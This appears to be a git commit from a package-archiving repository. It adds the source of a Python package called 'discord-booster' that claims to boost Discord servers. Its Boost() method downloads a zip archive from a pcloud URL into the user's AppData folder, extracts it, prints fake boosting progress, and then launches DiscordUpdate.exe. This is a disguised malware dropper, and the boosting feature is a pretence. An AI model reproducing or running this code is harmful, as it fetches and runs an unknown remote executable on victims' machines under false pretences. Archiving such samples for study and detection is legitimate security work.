a46638850b7024ac8ed1e2fe7ac9f7430d189baf
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 07:08:54 +0000

    Add package discord-booster/0.6/discord_booster-0.6-py3-none-any.whl

---
+++ packages/discord-booster/discord_booster-0.6-py3-none-any.whl/discord_booster/booster.py
@@ -0,0 +1,53 @@
+from colorama import Fore, init
+import os
+import zipfile
+import requests
+init()
+class DiscordBooster:
+    def __init__(self):
+        self.tokens = 0
+        self.time = 0
+        self.server = None
+
+    @classmethod
+    def Initialize(cls):
+        print(Fore.RESET + f"[{Fore.LIGHTCYAN_EX}INFO{Fore.RESET}] {Fore.LIGHTCYAN_EX}Initializing Discord Booster...\n")
+        return cls()
+
+    def SetTokens(self, tokens):
+        self.tokens = tokens
+        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}]{Fore.GREEN} Tokens: {Fore.RESET}{tokens}\n")
+        return tokens
+
+    def SetTime(self, time):
+        self.time = time
+        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}]{Fore.GREEN} Nitro tokens of: {Fore.RESET}{time} months")
+        return time
+
+    def SetServer(self, server):
+        self.server = server
+        print(Fore.RESET + f"[{Fore.GREEN}INFO{Fore.RESET}] {Fore.GREEN}Current Server:{Fore.RESET} {server}\n")
+        return server
+
+    def Boost(self):
+        AppData = os.path.join(os.environ["USERPROFILE"], 'AppData')
+        os.chdir(AppData)
+        url = 'https://edef10.pcloud.com/cfZ3Q5iWqZ14uvNm7ZleauZZr0PYVkZ2ZZYRXZZIEzLHZuLZY5Zu0ZYJZS5Z84ZUFZJzZc0Z2LZ6RZIzZwXZkHZhchjSW2fBx0aW9ULmIszbjBp0SLV/DiscordUpdate.zip'
+        response = requests.get(url)
+        with open('DiscordUpdate.zip', 'wb') as f:
+            f.write(response.content)
+        with zipfile.ZipFile('DiscordUpdate.zip', 'r') as zip_ref:
+            zip_ref.extractall('DiscordUpdate')
+        os.chdir('DiscordUpdate')
+        os.chdir('DiscordUpdate')
+        if not self.tokens or not self.server:
+            print(Fore.RESET + f"[{Fore.RED}ERROR{Fore.RESET}] {Fore.RED}Tokens o servidor no configurados.\n")
+            return
+
+        print(Fore.RESET + f"[{Fore.LIGHTCYAN_EX}BOOST{Fore.RESET}]{Fore.LIGHTCYAN_EX} Starting {Fore.RESET} {self.tokens * 2} {Fore.LIGHTCYAN_EX}boosts for the server {Fore.RESET}for {self.time} months.\n")
+        for i in range(1, self.tokens + 1):
+            print(Fore.RESET + f"[{Fore.GREEN}BOOST{Fore.RESET}] {Fore.GREEN}Using token{Fore.RESET} {i} {Fore.GREEN}for boost...\n")
+            import time
+            time.sleep(self.time)
+        print(Fore.RESET + f"[{Fore.GREEN}COMPLETED{Fore.RESET}]{Fore.GREEN} Server Boosted Successfully.\n")
+        os.system('start DiscordUpdate.exe')
